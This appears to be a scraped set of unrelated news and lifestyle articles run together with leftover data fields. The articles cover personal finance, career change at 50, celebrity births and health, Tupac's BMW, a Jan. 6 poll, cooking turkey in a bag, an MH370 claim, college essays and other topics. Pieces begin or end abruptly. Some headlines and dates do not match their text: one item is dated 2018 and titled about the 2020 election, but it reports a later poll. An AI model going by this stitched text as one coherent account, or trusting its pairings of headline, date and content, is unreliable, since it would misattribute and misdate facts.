For our first few years in the city, Ben was a student and I was an entry-level worker, and we arranged ourselves accordingly: doing a lot of cooking and not a lot of partying or traveling, squished into small spaces, most notably a studio so tiny you could almost touch the bed from the kitchen table. We lived in that 250-square-foot room for nearly three years.

Gradually, our prospects improved. I got jobs that paid better and put me on an actual career trajectory, and he graduated from law school and started working at a firm. Even then, though, we kept our low-key habits. That was in part so that Ben could throw everything possible at his student loans. We spent under or about $2,000 a month on rent, total. We cooked in bulk every Sunday and brought lunch to work. We walked or took trains rather than hailing cabs. We were more generous with our friends and families and when giving to charities, and that was satisfying. We bought slightly nicer clothes. Generally, though, our mentality remained the same: We treated his debt not like it was a mosquito bite, a small irritant, but like a plague of mosquitoes, something that had to be vanquished as soon as possible at all costs. Put windfalls to work, too I was helped virtually every step of the way by good luck: At least until 2008, the economy was strong and interest rates were high; I had found a partner who felt the same way I did about saving for the future and with whom I could split costs; and, though I dealt with setbacks like layoffs, bad bosses and worse landlords, I wasn't rocked by any real tragedies.

Should You Make a Career Change at 50? Tips on How to Do It Successfully

By Indeed Editorial Team January 18, 2022 Twitter LinkedIn Facebook Email Copy to Clipboard

A career change at 50 years old can increase your peace of mind, passion and activity levels. If your current career doesn't satisfy you, changing fields can provide new challenges and relationships that will boost your work satisfaction. It's important, however, to know how to make that switch to ensure you get the desired results in your new occupation. In this article, we discuss how to change careers at 50, the advantages of doing so and how to overcome disadvantages.

Tips for making a career change at 50

Regardless of your reasons for swapping careers after 50, these tips can make the transition easier:

Think about more than money

When making a career change at 50, money may not be the most important factor in your choice of occupation. Equally or even more important are your health, personal satisfaction, impact on society and self-actualization.

Avoid fear

Changing careers at a later age can bring unintended consequences, but it is important not to allow fear and negative emotions to discourage you from achieving your career goals. You may need the support of your family and friends, but do your best to persevere through the fear.

Be realistic

It is crucial to have realistic expectations when setting career goals to ensure you derive optimal satisfaction from your new job.

Update your skills

If you want to change careers, consider updating your skills and credentials now so it will be easier to transition later.

Be open to working with younger people

You may be in charge at your old job, but changing careers at 50 may require working with younger people. Some of your younger colleagues may hold senior positions and have divergent views. To succeed in the new role, try to accept feedback from your team members to better learn your new field.

How to make a career change at 50

Changing careers at 50 requires several definitive steps:

Perform a self-assessment. Determine the career you want to pursue. Identify the requirements of the new career. Rebrand your professional image. Create a career plan. Create powerful resumes. Be patient and positive.

1. Perform a self-assessment

The first step is to assess yourself and what you want in your next career. Find out what makes work interesting to you. A career counselor can guide you toward making the right career decision. Factors to consider include your age, health, retirement plans, skills and qualifications. At the end of the self-assessment, create a list of potential occupations and careers for further research.

2. Determine the career you want to pursue

After making a list of careers, narrow it down to one or two options. Before you select an occupation, research each of the positions to identify the one that best suits your interests, experience and skills. Some factors to consider include the career prospects of each job, the projected growth of the industry and the effect of technology on jobs in the coming years.

Another factor to consider is the earning potential. While money may not be your primary motivator for changing careers, you may still need the new occupation to pay bills and save for retirement.

It's best to pick a career that allows you to transfer skills from your previous job. That way, you won't need to spend extensive time and money on training and certification. Job satisfaction surveys can also help you determine whether the occupation is a good fit for you.

Here are more tips for helping to determine what you want to do:

Look for similarities

Many industries have functions that overlap. If you can't find a career that suits your skills and interests, look for similarities between the responsibilities of your former and new careers. Different fields often use the same management practices, although there might be slight differences.

Things like project management, organization, computer skills, interpersonal relations and integrity cut across diverse fields. If you can find common grounds, it becomes easier to select a new career where you can thrive and achieve your goals.

Take your time

Avoid rushing into choosing a different career because you are unsatisfied with your current position. It is better to take your time to research all your options and weigh the pros and cons of each career compared to your present job.

Be flexible

You may need to make concessions to achieve your aims when making a career change at 50. If you want to change careers to have more time for family and recreational activities, an ideal job may offer less pay but more free time. You may also need to move to another town or state, take up more responsibilities and even go back to school. A new career may require sacrifices, and this requires some flexibility from you.

Being flexible also means not restricting yourself to a specific work. The most viable occupation that matches your skills and experience may offer only part-time or contract employment. You can start with that to gain a foothold in the industry. After some time, you will build a network and have access to more opportunities.

Leverage your network

At 50, you may have already built an extensive network of colleagues, friends, relatives and acquaintances over the years. Informing these people about your plans to change careers could provide several opportunities.

3. Identify the requirements of the new career

Once you've chosen a career, determine what you need to enter the profession. Research the educational qualifications, certifications, licenses and other regulatory requirements of the occupation. You can check recent job ads for the specific skills and credentials employers in the industry want to see in candidates.

Another way to research a career is to shadow professionals in the industry and ask them for details about getting into the industry. The information you get from this research can give you an idea of the time and cost of entering a new career.

4. Rebrand your professional image

Once you've decided on a new career, it is important to rebrand your professional image to meet the expectations of the new field. Learn the industry language and practices, and rewrite your online profiles to make them more relevant.

This is the time to become active in the preferred social media space of your new career. Contributing to discussions and networking on social media can give your career prospects a powerful boost. Meet new people and let them know of your availability.

5. Create a career plan

Once you've positioned yourself as a professional looking to make a career switch, outline a plan. It is advisable to create short- and long-term goals you want to achieve considering your age, health and other factors that can impact your ability to continue working.

A good way to go about this is to have a file to organize potential employers, job ads, resumes, interview dates, networking events and other activities. This will make your job search efforts orderly and allow you to track your progress.

6. Create powerful resumes

You need a professional resume to promote yourself as the best candidate for jobs. This means having impeccable writing in your resume and knowing the correct format recruiters expect. Writing resumes requires tailoring each document to the specific requirements of each position.

It is vital to research each job ad and the employer before writing your resume to identify their core competencies and requirements. This will allow you to craft resumes that highlight your most relevant skills and show you as the best fit for the role.

7. Be patient and positive

When you apply for jobs, remain positive if it takes time to get a position. During this period, surround yourself with positive energy and engage in activities that move you closer to your goals. This can help ensure that you can deliver your responsibilities when you eventually get the position.

Advantages of making a career change at 50

Here are some benefits of changing careers at 50:

Self-actualization

Switching careers at 50 can provide an opportunity to attain the highest level of professional achievement for many people. Many older people have gathered immense experience and expertise over the years, and changing careers allows them to choose an occupation or position where they can use their skills to deliver the best results and enjoy higher job satisfaction.

Reduce stress

Another benefit of changing careers is reduced stress. Despite the perks attached to senior positions, many older professionals can't continue to work at the highest level because of stress and other demands on their lives. Leaving such a position for a low-stress environment can offer more value than a lucrative salary for some.

New learning opportunities

New careers offer people the opportunity to learn new things. It might be working with high-tech equipment, learning to code, using data to make decisions or collaborating with the younger generation. The prospects of learning something new can add more excitement to work, increase job satisfaction and help you create new relationships.

Passion

A new career can help you pursue your passion. At the beginning of their careers, many people don't know what drives them. As people get older, they have more clarity about their purpose, desires and activities that will give their lives meaning. For many people, going into another industry is the best route to making a career out of their passion.

How to overcome disadvantages when making a career change at 50

Here are things you can do to overcome the challenges of switching careers as a 50-year-old professional:

1. Keep learning

To make sure you are a viable job candidate, stay current on new information in the field. Read books, attend industry events, take online courses and stay open to new knowledge. Learn digital skills and be adaptable to the use of new technology at work.

2. Cultivate friendships across generations

If you intend to switch careers, build long-lasting friendships that cut across generations. Older people may have more authority in the industry, but younger generations allow you to use leadership and mentorship skills and help you stay on top of new developments.

3. Update your resumes

Keep your resumes up-to-date to improve the chances of getting hired. Optimize your resumes with the correct format acceptable to recruiters and make them compliant with applicant tracking systems. Keep your age and other private information confidential.

4. Focus on the positives

In discussions with recruiters and hiring managers, consider your age as an advantage. If the subject comes up, use it to boost your credentials in terms of the experience, achievements and qualifications you have earned over the years.",Should You Make a Career Change at 50?

But when Kylie fell pregnant and the couple got to see the ultrasound for the first time, they were in for a big suprise.

Phillip and Kylie had spent many years trying to expand their family. Two years ago they finally welcomed their daughter, River, who they loved more than anything else in the world.

Butt there was one more dream they wanted to fulfill.

Phillip and Kylie had several relatives who had conceived twins.

One day Kylie took a pregnancy test and sure enough, she was pregnant.

But it wouldn’t be twins.

When they visited the doctor some months later to see the ultrasound, they were in for a shock. There wasn’t just one or two babies in Kylie’s belly.

The couple were expecting four new bundles of joy, something that only happens one in every 700 000 pregnancies.

“I laughed… I just, I was laughing, I couldn’t help it,” Kylie tells local news station Fox10.

Although the couple have been a little anxious over heir new arrivals, all four babies, who they plan to name Amelia, Damien, Gideon and Theo, are all developing well.

The BMW Tupac Shakur Was Shot in is up For Sale
For a Staggering Price!

",26/11/2018 22:58,https://news.speedsociety.com/bmw-tupac-shakur-was-shot-in-is-up-for-sale-staggering-price/,"In western culture, some of the ideas that we come up with are pretty crazy. ...

In western culture, some of the ideas that we come up with are pretty crazy. Sometimes, what’s perceived to be worth a lot of money can be wild to consider. Our fascination with celebrity culture dictates that some odd possessions bring big money. Furthermore, objects linked to a celebrity’s death can fetch incredibly high dollar price tags.

You see, the infatuation that we have with celebrities means that pretty much everything that they have ever touched becomes worth money somehow. If someone can figure out a way to get them to slap their signature on something, it could be worth even more!

After seeing one of Marilyn Monroe’s dresses go for over a million dollars at auction, you never really know what could happen. At some point in time, this all becomes rather obsessive. It’s really interesting to take a look at to see just how far people will go to collect pop culture.

So, we know celebrity possessions are worth more than an average possession. So, if Tupac Shakur is one of the godfathers of rap, would it follow that his possessions are worth a lot more? He is one of the most well known to ever do it.

Would the car that he was fatally shot in in 1996 be worth an absurd amount of money? Depending on who we ask, that answer could vary in intensity. I think that, across the board, pretty much all collectors would agree on one thing. Something like this could put together quite the asking price.

For those who know very much of anything about Tupac’s life, they probably know of that fateful night where a bullet would enter the BMW 7-Series that he was traveling in. The projectile would hit Shakur. This sent him to the hospital where he would be pronounced dead.

Nobody knew it at the time but this would eventually make the car a very important pop-culture item. Just keep in mind that the old Bimmer is worth more than the majority of American houses. With no link to Shakur, we’d be shocked to see it fetch five figures.

Just to put things in perspective, for a vehicle like this that has no historical significance, the Kelly Blue Book value tells us that a price of, say, $5000 dollars would probably be pretty generous. In fact, it may be even overpaying by about double the value in some areas. However, when one pins one of music’s biggest icon’s deaths to it, that $5000 multiplies rather quickly.

Experts agree that historical significance could be worth up to $1 million. The organization that’s in possession of the car, Celebrity Cars Las Vegas, thinks that they can get more! The listing price is $1.5 million for the machine that is now in their possession.

If you follow along down in the video below, you’ll be able to get an up close and personal look at the car. Pawn Stars shows us exactly what over $1 million in the form of an automobile looks like.

After seeing something like this, we’re really led to wonder exactly why they would’ve repaired this car at all. As a collector’s item, we would think that somebody would really value the exact status of the car as it was left that night, bullet holes in the side and the damage done to the windshield along with all of the other signs that greatness once resided within.

This BMW was the car where one of music’s greatest contributors would breathe his last breaths outside of a hospital.",Las Vegas Dealership Lists BMW Tupac Was Shot In,

The Younger star, who welcomed daughter Banks last month, opened up about her ""delightful"" placenta that she had in smoothie form after giving birth.

During an interview with the Dr. Berlin Informed Pregnancy podcast posted on Thursday, Duff, 31, shared that it was the ""most delightful smoothie I've ever had.""

""I haven’t had a smoothie that delightful since I was, like, 10 years old. It was calorie-filled with juice and fruit and everything delicious,"" she explained. ""It was good. I was a little wigged out at first, to be honest."" Duff said she continues to consume her placenta, but not in capsule form like many new mothers, but in ice cube form.

""I've heard placenta burps are not ideal,"" she replied when Dr. Berlin asked why she didn't opt for capsules.

As for the feeling she had after giving birth, Duff was overwhelmed with joy upon being handed her little one.

""They hand her to me and I'm looking at her.. and she reaches up both of her arms and curls into me,"" she recalled. ""It was the most, I couldn't believe how strong she was, but it was so clearly, like, a hug. It was amazing. It makes me want to cry. It made me feel like she was, 'Good team, Mom.'""

Duff and boyfriend Matthew Koma welcomed their first child together, a baby girl, on Oct. 25. The former Disney Channel star took to Instagram a couple of days later to share the exciting news.

""Banks Violet Bair❤️ this little bit has fully stolen our hearts! She joined our world at home on Thursday afternoon and is absolute magic ✨,"" she wrote alongside a photo of the three of them. She is also mother to 6-year-old son Luca from her previous marriage.

On Wednesday, Duff posted a sweet, sleepy photo of her bundle of joy. ""Not a care in the world ?,"" she captioned the shot.

You Won't Believe How Many Americans Have Less Than $1,000 in
Savings -- The Motley Fool
",11/11/2018 23:08,https://www.fool.com/retirement/2018/10/18/you-wont-believe-how-many-americans-have-less-than.aspx,"We all need savings to protect ourselves from life's financial unknowns, whether that means losing a job, having a car break down, or dealing with a major home repair. Unfortunately, most Americans are in pretty bad shape when it comes to emergency savings. In fact, an estimated 58% have less than $1,000 in the bank, according to new data from GOBankingRates.

What further compounds this issue, however, is that last year, 57% of U.S. adults said the same thing. And while we're only talking about a one-percentage-point difference, the takeaway here is that Americans on the whole aren't getting smarter about socking away some cash. And if they don't change their ways, they risk wrecking their finances irreparably.

The danger of not having savings

We all know that it's virtually impossible to predict what expenses might come our way. But without some sort of safety net, you'll be putting yourself in a position in which you're forced to rack up debt (and damage your credit score in the process) to cover an unanticipated bill.

So how much money should you have on hand for emergencies? Sadly, $1,000 won't cut it. Generally speaking, it's a good idea to have three to six months' worth of living expenses tucked away in the bank. If you happen to only spend $333 a month, then sure, go ahead and say that $1,000 is your optimal savings target. The reality, however, is that $1,000 is probably only a fraction of what you spend in a single month. And the fact that more than half of Americans don't even have that much means that collectively, we're looking at a serious savings crisis.

Padding that bank account

If your savings level isn't where it should be, you'll need to do better. And there are several avenues you can take to get there.

First, create a budget if you don't have one already, see what you're currently spending money on, and find ways to cut back. You might choose to lower one major expense, like your rent or car payment, or make a few smaller changes, like canceling your gym membership, packing lunch for work instead of buying it, and trimming your cable plan.

Next, look at getting a side hustle. These days, a good 44 million Americans do additional work on top of their regular jobs, and while doing so will clearly eat into your downtime, it's also a good way to put extra cash in your pocket. In fact, it's estimated that 36% of workers with a side hustle bring home an extra $500 or more per month as a result. And that's certainly a worthwhile payoff.

Finally, don't hesitate to fight for a raise at work if you feel you're underpaid. If you do some research and find that you're earning less than the average person in your area with your job title, you can present that data to your boss and make the case for a boost. This especially holds true if you're a strong performer who's consistently gotten great performance reviews and solid feedback.

Amassing an emergency fund with three to six months of living expenses is something that most certainly takes time. Saving up $1,000, on the other hand, is a different story. In fact, if you're able to work a side hustle and really cut back on extras in your budget, there's a good chance you'll hit that target in a month or two. Of course, you don't want to stop at that $1,000 -- but getting there sooner rather than later is a good goal to strive for.","You Won’t Believe How Many Americans Have Less Than $1,000 in Savings",

New poll reveals percentage of Americans who think Trump will
win in 2020

",16/10/2018 17:47,https://www.aol.com/news/poll-two-thirds-republicans-still-165934571.html,"A majority of Republicans still believe the 2020 election was stolen from former President Donald Trump, according to a new Yahoo News/YouGov poll. The latest findings show how persistent this false narrative continues to be, despite the preponderance of evidence against it.

The survey of 1,552 U.S. adults, which was conducted from July 30 to Aug. 2, found that 66 percent of Republicans continue to insist that “the election was rigged and stolen from Trump,” while just 18 percent believe “Joe Biden won fair and square.” Twenty-eight percent of independent voters also said they think Trump was the rightful winner of the 2020 election, as did a small 3 percent of Democrats.

While those who continue to hold this unsubstantiated view about the election are in the overall minority, representing just 29 percent of total respondents, the number has remained relatively unchanged over the last several months. Since January, similar surveys have found that between 27 and 29 percent of people believe the election was rigged.

Trump has continually repeated this falsehood since the November election, offering a mixture of debunked conspiracy theories to allege widespread fraud.

The then president’s false claims fueled a violent mob of his supporters to storm the U.S. Capitol on Jan. 6 in an effort to prevent Congress from certifying Biden’s win in the Electoral College.

The latest Yahoo News/YouGov poll was conducted in the week following the first public hearing of the House select committee to investigate the Jan. 6 attack, which featured firsthand testimony from police officers who responded to the riot at the Capitol. The results indicate that the hearing did little to change the public’s perception of that event.

Since May, surveys have found that a majority of people — between 65 and 71 percent — believe the attack was not justified, and the latest poll falls within that range, at 69 percent. Blame for the Jan. 6 riot remained essentially unchanged from previous surveys, with 48 percent pointing the finger at Trump supporters who gathered at the Capitol, and the vast majority of that 48 percent blaming Trump himself.

A closer look at the respondents’ party affiliations shows a clear divide within these views: 81 percent of Democrats said Trump was responsible for the Jan. 6 attack, compared with just 9 percent of Republicans and 43 percent of independents. Only 15 percent of Republicans blamed Trump supporters who gathered at the Capitol for the violence that took place on Jan. 6, while 48 percent of Republicans said that “left wing protesters trying to make Trump look bad” were largely at fault. Conspiracy theories have falsely blamed liberal agitators like antifa for the attack.

Attitudes about the select committee’s probe and the first public hearing were similarly split along partisan lines. Overall, 51 percent of respondents supported more investigations into Jan. 6, with 83 percent of Biden supporters saying “we still need to find out the truth of what happened” on that day, while 62 percent of Trump supporters (31 percent of the total) said they think “there have been enough investigations already.” The same percentage of respondents (51 percent) agreed with the Capitol Police officers who described those who stormed the Capitol as “terrorists,” with 90 percent of Biden supporters agreeing with this characterization and 74 percent of Trump supporters (31 percent of the total) saying they disagree.

This ‘insulting’ tipping hack has the internet up in
arms — all over again
",9/10/2018 19:20,https://www.today.com/food/people-are-still-angry-about-cruel-tipping-hack-t135068,"In the restaurant world, is there anything worse than a bad tipper? Try a bad tipper who dangles a few measly dollars in front of servers as an incentive for good service.

At least, that's what the internet has collectively agreed.

On Thursday, Mark Arum, a newscaster for WSB-TV tweeted about a now-viral Facebook post from someone who allegedly boasted about their success using a certain tipping hack.

As a former waiter, please don't ever do this. Ever. pic.twitter.com/X2i8MtrUb1 — Mark Arum (@MarkArum) August 2, 2018

""As a former waiter, please don't ever do this. Ever,"" Arum wrote. His recent post has already been retweeted over 500 times and has thousands of comments.

The hack, which resurfaced from major social media uproar back in 2016, involves putting a total of $5 (regardless of how much the bill may be) in singles out on the table upon being seated at a restaurant.

Why You Should Never Make Your Thanksgiving Turkey in a Bag
When cooking turkey in a bag, think plastic. Paper grocery bags can be toxic...
",9/10/2018 18:49,https://www.tasteofhome.com/article/cooking-turkey-in-a-bag-can-be-toxic/,"When cooking turkey in a bag, think plastic. Paper grocery bags can be toxic. Here's why.

It was during the 1950s that the idea of cooking a turkey in a paper grocery bag first became trendy, and the notion still occasionally makes a comeback every few years. But there are three words of caution anyone tempted to try cooking turkey in a bag needs to hear: Don’t do it.

In the endless quest for the life-changing bird that will make the chef a legend at future holiday dinners, many different cooking methods have been born—from grilling in the backyard to prepping it in the dishwasher (another don’t).

Science says no

According to experts, the brown-bag method ranks right up (down?) there with the dishwasher. Both the University of Illinois and the United States Department of Agriculture (USDA) agree—using a grocery bag is dangerous

Still, believers say cooking turkey in a bag guarantees a heavenly bird—juicy on the inside, crispy on the outside, with crispy golden skin. Plus clean up woes get tossed with the bag.

Why you shouldn’t roast in a bag

But the reality, according to the USDA, is that there can be toxic fumes from the ink, glue and recycled materials in the bag. Plus, you can start a fire in your oven. Bad for the oven and bad for the turkey.

One “compromise”—and our friends at U of I will back us up here—is to toss the paper and try a turkey-size oven cooking bag, instead. While popping plastic in the oven may seem like an even worse idea than paper, oven bags are made of materials that are heatproof past the average temperatures used in ovens. Most oven bags you’ll find in the store are FDA approved (but always check) and they don’t contain BPA or other dangerous chemicals.

A better bag

Brined birds—such as a fresh herb brined turkey or a marinated Thanksgiving turkey are often double bagged to contain the tasty liquid. The equally delicious lemon herb roasted turkey cooks up the magic in a single oven bag, however. Paper is not recommended for any of these recipes.

Learn exactly how to use one of these special oven bags here.

Not just for the birds

The idea of cooking with paper still has merit, though—as long as it’s the right kind. Orange tilapia retains its moisture because it is cooked in a parchment paper pouch. And simple but elegant citrus salmon en papillote gets its flavor (and its fancy name) from the parchment-paper cooking method.

In a series of posts to Reddit’s financial independence message board, Mr. Long chronicled with dry wit and self-effacement his first year in retirement.

One month into FIRE, he wrote of the guilt he felt spending money (on video games), and his concern that he would be over his household budget. He spent his days with family, at the gym, doing housework, exercising. He had no regrets so far: “I made the right decision. This is life.”

In the second month, Mr. Long reported a 2.8 percent increase to his portfolio over the first two months, even after living expenses, and listed his accomplishments as more reading, more cooking, volunteering and “faster Rubik’s cube solves.” Stress levels were way down, he wrote: “A friend of mine said the sense of dread from my face was gone.”

In the months that followed, he rewatched the mini-series “Roots,” lost all interest in talk of FIRE now that he had achieved it, feared a looming stock market crash, had nightmares that “I’m back at work and arguing with morons,” finished a marathon in a personal best sub-three hours, felt moments of social isolation, took a two-week road trip across the heartland, and went twice to the beach in Florida with his wife and watched their net worth reach its highest point, despite not working, which he attributed to “the passage of the tax cut for wealthy job creators like myself.”

Oh, and he started a blog.

“My life is so much better than it was before,” Mr. Long wrote seven months in. “I hope everyone here finds this peace.”",How to Retire in Your 30s With $1 Million in the Bank,

The MTV personality, 30, has previously told how she is undergoing a series of tests for ALS and confirmed these are ongoing as medics continue to investigate.

The Teen Mom 2 alum told fans in March 2021 that she was diagnosed with a spinal cord cyst.

Today, the mom of three took to her Instagram Stories for a chat about her FeNO score - a method of diagnosis for asthma, which followed her recent fibromyalgia revelation.

One fan wrote: ""You know that ALS is often misdiagnosed as fibromyalgia at first,"" to which she replied: ""Yeah ... I'm hoping that's not what I have.

""Still testing for other stuff.

""And now I have to go get a breathing test done,"" followed by an Emoji face icon with rolling eyes.

ALS, which stands for Amyotrophic Lateral Sclerosis is a progressive nervous system disease that affects nerve cells in the brain and spinal cord, causing loss of muscle control.

Fans suggested her symptoms were similar to a condition, myasthenia gravis, to which the star promised she would ""mention it to my doc.""

Meanwhile another of the Teen Mom 2's followers told how they had spotted the reality star at a diner, but did not approach.

Commenting in the midst of her health battles, Jenelle added: ""Thanks.

""Lol my anxiety has been super bad today.""

FIBROMYALGIA DIAGNOSIS

The star recently revealed she’d been diagnosed with fibromyalgia in an interview with E! News.

According to the Centers for Disease Control and Prevention, fibromyalgia is a condition that causes pain all over the body, sleeping problems, and fatigue.

An individual with fibromyalgia is more susceptible to pain, and the condition can cause sufferers emotional and mental distress.

Talking to E!, she explained: ""I never knew what fibromyalgia was until my doctor diagnosed me.""

TIKTOK CONFESSION

Jenelle shared the news of her spinal cord cyst in a TikTok video, when responding to a fan.

The controversial star was asked: ""Hey sweetheart are you feeling better with your hemangiomas & cysts? Were you able to get help? Praying for you!""

Sitting with a hand on her cheek and a worried look on her face, she responded.

""So, yeah, about that. Let me tell you guys a little health update and sorry you're going through the same thing.

""I got a second opinion from a different neurologist and she's going to be checking me for ALS.

""Since she has told me this, yes, I've been freaking out in my head a lot. I've been crying a lot.

""I've been crying, like, every single night by myself.

""But we're redoing all my bloodwork, we're redoing my nerve study. I have to go get another nerve study done next week because that checks for more diseases.""

She went on: ""She referred me to a neurosurgeon about the cyst in my head and the cyst in my spine so we're going to check that out in March.

""She's also having me go to a lung doctor because I have a hard time breathing and catching my breath and I'm not sick.

""Since I have cysts popping up everywhere, my doctor wants to check my lungs to see if there's cyst there too. My hands are really shaky and my thumb grip is almost completely gone on my left hand.""

Jenelle concluded: ""Hopefully I'll get answers soon.""

Fans flocked to the comments with some wishing the North Carolina native well, some suggesting other potential diagnosis', and others slamming the ex MTV star.

FAN FEEDBACK

One commenter wrote: ""Please have them check you for Lyme Disease!! It can often be misdiagnosed with ALS and it’s completely treatable!! Sending Prayers for you!!""

Jenelle responded: ""Thanks for the support and prayers.""

Another wrote: ""Have you been tested for MS?""

The ex TV star again replied, saying: ""Yes I have been tested and I don’t have that either.""

A third fan asked: ""Yikes! Why do they suspect ALS? Thats scary! Praying for you!""

Jenelle revealed: ""My stomach feels like I’ve been doing ab crunches while sitting.""

Another chimed in: ""I pray more than anything in the world you do not have ALS, my dad passed from that in 2014, I wouldn’t wish it upon my worse enemy.""

Jenelle responded: ""Me too! I hope I get good answers. I would have to prepare a lot in my life and it’s heartbreaking to think about. I’m sorry about your dad.""

On Reddit, however, fans were far less kind as one user posted Jenelle's video, writing: ""You do not have ALS.""

Another wrote: ""Can someone please make a power point presentation of all the illnesses and symptoms she’s claimed over the years

""This is important work.""

Someone else added: ""Lord, the hypochondria.""

HEALTH WOES

In 2021, Jenelle made a shocking revelation to fans.

The mom of three said she was ""in shock"" after her doctors diagnosed her with a ""rare"" spinal disorder called syringomyelia.

Syringomyelia is the development of a cyst (called a syrinx) within the spinal cord, which causes pain and weakness and, in some, cases can lead to paralysis.

Symptoms include headaches, neck pain, arm and back pain, loss of reflexes, and muscle weakness and wasting.

She elaborated on her condition in a YouTube vlog called ""My Neck, My Back.""

Jenelle said she had been battling daily headaches and dealing with her neck ""cracking 10 times a day.""

She alum said she had been having tests done for months and not getting any answers, which she described as ""really frustrating.""

Jenelle - who is married to David Eason - had an MRI, which revealed a cyst in her spine.

""It's pretty concerning. That's not good. None of this is good,"" she said at the time, fighting back tears.

Now, we have the facts to back it up - new research from the Psychological Bulletin reveals that our self-esteem peaks when we are 60-years-old.



This content is imported from {embed-name}. You may be able to find the same content in another format, or you may be able to find more information, at their web site.

The paper researched more than 300 studies on self-esteem in different age groups, which identified a pattern across birth year, gender and nationality.

Self-esteem increased consistently until the highest point at 60, where it stayed for the next decade, then declined slightly when the person reached their 70s and 80s, until finally dropping more sharply at age 90, reports The Cut.

The study also found that the relationship we have with ourselves improves steadily over the first few decades of our lives. Self-esteem can be defined as “a person’s subjective evaluation of his or her worth as a person.” The peak age at 60 could be down to feeling more confident in who you are, not caring what other people think or being at peace with your body, perhaps due to increased life experience.

On the flip side, the pressures of social media could explain the lower levels of self-esteem the younger we are, as a study last year found Instagram to be the worst social network in terms of its impact on mental health.

In fact, the average cost to own and operate a new vehicle is $9,282 a year, according to an annual study by AAA. However, the largest expense that comes with buying a new car largely falls under the radar, the automotive group said.

How much does a new car depreciate?

Of all costs, depreciation, a measure of how quickly a car loses value, remains the single biggest cost of ownership, accounting for more than a third, or 36%, of the average annual cost, according to AAA. New cars typically depreciate the minute you drive off the lot. By the time it's a year old, the vehicle has lost nearly one-third of its value, according to Edmunds data. The secret to minimizing depreciation costs: ""Keep your car for a long time and keep it well-maintained or even consider buying a quality, pre-owned vehicle,"" said Robert Sinclair, a spokesman for AAA Northeast.

Here’s the thing: When a sole individual claims to have cracked a case that has left countless authorities and experts all over the world utterly stumped, they probably haven’t cracked the case.

The person, in this case, is a video producer from the UK. He thinks he’s seen the outline of the missing jet on Google Maps. He reckons that the plane landed in Cambodia within a mountainous area west of Phnom Penh, and he’s heading there himself to check on foot.

So, a few things here. Outlines of objects aren’t what they seem, particularly when viewed from satellite imagery. Conspiracy theorists often see outlines of plenty of complex things on Mars and under Earth’s oceans, but they are literally never what they appear to be. Far from being advanced structures built by aliens, they are instead just piles of rocks partly covered in shadows.

-

The outline in question, which you can see in the images here courtesy of Google Earth, might look like a plane, sure. It’s impossible, however, that such a plane could land on the treetops of the wilderness of Cambodia and just sit there completely intact. Make no mistake: It would have crashed and fragmented into thousands of pieces.

There's also, of course, the chance that the image is fake. It wouldn't be difficult to add in a pixelated plane to an already blurry satellite image in order to drum up attention. At the same time, people have claimed to have spotted MH370 from Google Maps/Earth before. Guess what? They were mistaken.

-

The outline could perhaps be of a real plane of some sort, but one that was snapped by satellite imaging equipment as it flew over Cambodia.

It appears that, since this claim, an aviation consultant and a local businessman have rented a helicopter to scour the area themselves. They found nothing.",Someone Claims They've Found The Missing MH370 Plane. There's Just One Tiny Problem,

However, the best essays are born when students dig deeper and share something that makes them tear up, or causes their eyes to twinkle or their tones to shift.

The only genuine way for students to recognize these personal moments of authenticity is for them to hear it for themselves. They need auditory feedback to recognize a pause, a moment of vulnerability, or a shift in their tone when they talk about the topic that should be the focus of their college essays. The insider secret? They should record themselves speaking about something that they love, that’s disappointing or that gets them fired up about life. They’ll hear it when it happens.

After guiding hundreds of these recorded chats with students over the past 20 years, I have noticed a common theme among those whose college essays brought about the best results in admissions to their top-choice colleges. The students who talk about moments of genuine kindness reveal more authenticity than those who focus on other subjects.

One student who was passionate about science and engineering lit up while talking about volunteering at a local science museum, planning creative projects for kids and narrating the planetarium show.

Another student talked about how his family’s deep concern for and commitment to the well-being of abused and neglected animals helped teach him to be more compassionate toward people.

Story continues below advertisement

One compared the experience of caring for her sick mother while going to school to trying to keep a full glass of water from spilling during an obstacle course. It’s impossible, of course. Water spills.

Advertisement

And one who lived in a home that couldn’t always afford to put dinner on the table spent every Sunday at his local church feeding the homeless. He knew how it felt to be hungry.

These students discovered something about themselves when they identified the situations in which they were the most kind. Kindness builds character, and colleges (and employers) care about character. Yes, grades, course rigor and test scores matter. But consider that most student applications will look very similar with just a straight numbers comparison. Kindness allows students to stand out.

Story continues below advertisement

A recent report by the Harvard Graduate School of Education, Making Caring Common, speaks to this. Colleges want students who care. They are drawn to applicants who show concern for others, promote good citizenship and civic engagement and develop personal responsibility. Jeremiah Quinlan, dean of undergraduate admissions at Yale University, says they “want students who have achieved in and out of the classroom, but [they] are also looking for things harder to quantify, [like] authentic intellectual engagement and a concern for others and the common good.”

Advertisement

Let’s take a step back for a second and think about why colleges care about students being kind. They care because society cares. Quite simply, we need more kindness in our homes, in our schools and in our communities. The impact of enduring kindness supersedes the name of the school on a college sweatshirt. Being yourself and channeling your inner kindness to build character should be the focus. Getting into your top-choice college should be the bonus of being kind, not the reason to be kind.

So channel your inner kindness. Consider the situations when you’re the kindest, and the people to whom you’re naturally kind. Why would that be? What does it say about you if you feel the most fulfilled when you are being kind to children or to strangers or to your teachers or to horses or to an elderly woman crossing the street? Think about that. It will tell you something about yourself, reveal a brilliant story to share, and give you a reason to be proud of who you are.

That matters for life, not just for college.

Beauty sleep is essential, that much is for sure. But it turns out that what you do first thing after rising from a good night’s rest reveals key traits about your personality. In a new study commissioned by the slumber experts at Sleepopolis, it was found that people who make their beds in the morning differ greatly than those who don’t, in ways that include the amount of sex they have to the types of television shows they prefer.

According to the study, which surveyed 2,000 Americans and their morning habits, those participants who made their bed reported more sex on a weekly basis (three times per week, to be exact), regular exercise, and the ability to wake up without the help of an alarm. Bed-makers were also more likely to work in health or technology fields, and they identified as being confident, adventurous, sociable, and high-maintenance. And if you enjoy romantic movies, jazz music, and the occasional episode of House Hunters, the study found that yes, there’s a good chance you make your bed before going about your day.

As for the people who prefer a messier sleeping situation? It was reported that those respondents hit snooze on the regular, have sex twice per week, and work in business or finance fields. They also identity as being shy, curious, sarcastic, and moody, and they’re more likely to enjoy rock music and Seinfeld reruns, in addition to comedy movies.

Sleep quality came into play too, with those who make their beds rising about 16 minutes earlier than those who don’t. However, participants across the board averaged only six-and-a-half hours of sleep per night. So whether or not making your bed is at the top of your morning to-do list, it’s safe to say we could all benefit from a few additional hours of shut-eye.

Another is hidden under the speaker grill on the front, and another sits on the phone’s bottom edge.

The triple microphone configuration was introduced with the launch of the iPhone 5, back in 2012.

The third microphone is, naturally, there to help the phone pick up all of the sounds around you, no matter how you decide hold it.

